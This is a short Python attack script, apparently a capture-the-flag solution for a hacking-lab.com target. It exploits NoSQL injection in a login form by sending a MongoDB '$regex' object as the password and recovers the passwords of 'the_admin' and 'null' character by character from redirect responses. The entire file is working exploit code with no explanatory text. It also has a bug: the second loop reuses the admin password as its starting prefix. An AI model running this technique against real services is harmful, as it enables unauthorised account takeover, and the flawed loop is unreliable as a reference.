import requests
import string
pw = "^"

# BF admin
print("Bruteforcing pw of 'the_admin'")
found=False
while True:
    #print("Searching next char")
    found=False
    for cur in range(48,126):
        if cur==63: continue
        nexttry=pw+chr(cur)+'+'

        data = { "username": "the_admin", "password": {"$regex": nexttry}}
        #print("Trying {0}".format(data))
        ans = requests.post("http://whale.hacking-lab.com:3371/login",json=data,allow_redirects=False)
        if ans.status_code==302:
            pw += chr(cur)
            print("Found next char! PW={0}".format(pw))
            found=True
            break;
    if not found:
        print("PW = {0}".format(pw[1:]))
        break

# Try to break the pw for user "null"
print("Bruteforcing pw of 'null'")
found = False
while True:
    # print("Searching next char")
    found = False
    for cur in range(48, 126):
        if cur == 63: continue
        nexttry = pw + chr(cur) + '+'

        data = {"username": "null", "password": {"$regex": nexttry}}
        # print("Trying {0}".format(data))
        ans = requests.post("http://whale.hacking-lab.com:3371/login", json=data, allow_redirects=False)
        if ans.status_code == 302:
            pw += chr(cur)
            print("Found next char! PW={0}".format(pw))
            found = True
            break;
    if not found:
        print("PW = {0}".format(pw[1:]))
        break
